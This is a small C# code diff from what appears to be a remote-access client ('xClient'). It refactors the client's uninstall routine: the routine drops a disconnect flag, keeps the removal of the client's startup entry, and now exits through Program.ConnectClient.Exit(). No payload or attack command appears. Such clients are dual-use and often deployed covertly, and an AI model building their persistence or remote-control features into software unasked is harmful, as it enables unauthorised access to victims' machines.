@@ -2,7 +2,6 @@
 using System.Diagnostics;
 using System.IO;
 using xClient.Config;
-using xClient.Core.Data;
 using xClient.Core.Helper;
 using xClient.Core.Networking;
 using xClient.Core.Utilities;
@@ -34,10 +33,10 @@ namespace xClient.Core.Installation
                 };
                 Process.Start(startInfo);
 
-                ClientData.Disconnect = true;
                 if (Settings.STARTUP)
                     Startup.RemoveFromStartup();
-                client.Disconnect();
+
+                Program.ConnectClient.Exit();
             }
             catch (Exception ex)
             {
